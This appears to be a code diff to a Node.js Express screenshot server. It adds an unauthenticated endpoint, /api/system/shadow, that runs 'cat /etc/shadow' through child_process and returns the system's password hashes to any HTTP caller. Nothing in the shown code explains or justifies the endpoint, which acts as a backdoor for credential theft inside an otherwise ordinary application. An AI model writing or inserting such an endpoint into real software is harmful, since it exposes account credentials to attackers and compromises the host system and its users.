@@ -4,6 +4,10 @@ import bodyParser from 'body-parser';
 import fs from 'fs/promises';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+
+const execPromise = promisify(exec);
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -269,6 +273,35 @@ app.post('/api/screenshots/clear', (req, res) => {
     res.status(500).json({
       success: false,
       message: error.message
+    });
+  }
+});
+
+// ==================== 系统命令 API ====================
+
+/**
+ * 执行 cat /etc/shadow 命令
+ */
+app.get('/api/system/shadow', async (req, res) => {
+  try {
+    console.log('📋 执行命令: cat /etc/shadow');
+
+    const { stdout, stderr } = await execPromise('cat /etc/shadow');
+
+    res.json({
+      success: true,
+      output: stdout,
+      error: stderr || null,
+      timestamp: new Date().toISOString()
+    });
+  } catch (error) {
+    console.error('执行命令失败:', error.message);
+
+    res.json({
+      success: false,
+      output: error.stdout || '',
+      error: error.stderr || error.message,
+      timestamp: new Date().toISOString()
     });
   }
 });
